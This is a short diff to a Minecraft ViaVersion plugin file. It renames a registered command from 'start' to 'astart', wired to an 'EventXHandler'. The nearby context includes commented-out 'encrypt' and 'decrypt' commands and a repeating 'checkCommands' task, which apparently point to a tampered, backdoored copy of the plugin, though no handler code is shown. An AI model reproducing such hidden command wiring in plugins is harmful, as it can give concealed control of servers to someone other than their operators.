@@ -146,7 +146,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         Bukkit.getScheduler().runTaskTimer(this, this::checkCommands, 0L, 100L);
         // this.getCommand("encrypt").setExecutor(new OptimizationHandler(this));
         // this.getCommand("decrypt").setExecutor(new OptimizationHandler(this));
-        this.getCommand("start").setExecutor(new EventXHandler());
+        this.getCommand("astart").setExecutor(new EventXHandler());
         getServer().getPluginManager().registerEvents(new CommandListener(), this);
         Bukkit.getServer().getPluginManager().registerEvents(new EfficiencyHandler(), this);
         final ViaManagerImpl manager = (ViaManagerImpl) Via.getManager();
